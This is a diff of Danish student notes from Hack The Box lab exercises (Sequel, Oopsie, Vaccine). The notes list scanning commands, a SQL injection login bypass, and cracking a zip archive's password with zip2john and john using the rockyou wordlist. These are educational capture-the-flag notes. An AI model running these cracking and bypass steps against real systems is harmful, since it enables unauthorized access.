@@ -236,7 +236,7 @@ Her kan der ses at vi kan bi pass adgangskoden hvis vi bruger “ ‘# “, det 
 
 
 
-* Sequel opgave (Lavet med David):
+* Sequel opgave (Lavet med Casper:
      * nmap {target_ip}
        Får åbne porte og versioner.
      * sudo apt-get update && sudo apt-get install MySQL
@@ -248,30 +248,30 @@ Her kan der ses at vi kan bi pass adgangskoden hvis vi bruger “ ‘# “, det 
      * SELECT * FROM config;
        Herunder ligger flaget
 
-   * Oopsie opgave (Lavet med Casper)
-     * nmap {target_ip}
-     * gobuster dir -u {target_ip} -w wordlist
-     * sudo apt update && sudo apt install burb
-     * Stuck her so far da vi ikke kunne komme ind på services på kalilinux
-     * 
-   * Vaccine (Lavet med Casper)
-     * nmap {target_ip}
-       Finder ftp
-     * ftp {target_ip}
-     * ls -a
-     * john -h
-     * zip2john backup.zip > hashes
-     * ls
-     * cat hashes
-     * zip2john backup.zip
-     * john -wordlist=/usr/share/wordlists/rockyou.txt.gz hashes
-       Filen skal extractes da det ikke er rockyou.txt
-     * john -wordlist=Documents/rockyou.txt hashes
-       Extractede den bare til documents
-     * john --show hashes
-     * unzip backup.zip
-     * Læser det hashede password i index.php
-     * echo 'password' hash
+ * Oopsie opgave (Lavet med Casper)
+   * nmap {target_ip}
+   * gobuster dir -u {target_ip} -w wordlist
+   * sudo apt update && sudo apt install burb
+   * Stuck her so far da vi ikke kunne komme ind på services på kalilinux
+   * 
+ * Vaccine (Lavet med Casper)
+   * nmap {target_ip}
+     Finder ftp
+   * ftp {target_ip}
+   * ls -a
+   * john -h
+   * zip2john backup.zip > hashes
+   * ls
+   * cat hashes
+   * zip2john backup.zip
+   * john -wordlist=/usr/share/wordlists/rockyou.txt.gz hashes
+     Filen skal extractes da det ikke er rockyou.txt
+   * john -wordlist=Documents/rockyou.txt hashes
+     Extractede den bare til documents
+   * john --show hashes
+   * unzip backup.zip
+   * Læser det hashede password i index.php
+   * echo 'password' hash
      
   hackthebox penetration teset gik mest ud på at finde ud af hvor der var et "hul" altså et sted i systemet hvor der var nogle der havde slacket lidt så vi kunne få adgang til det
   
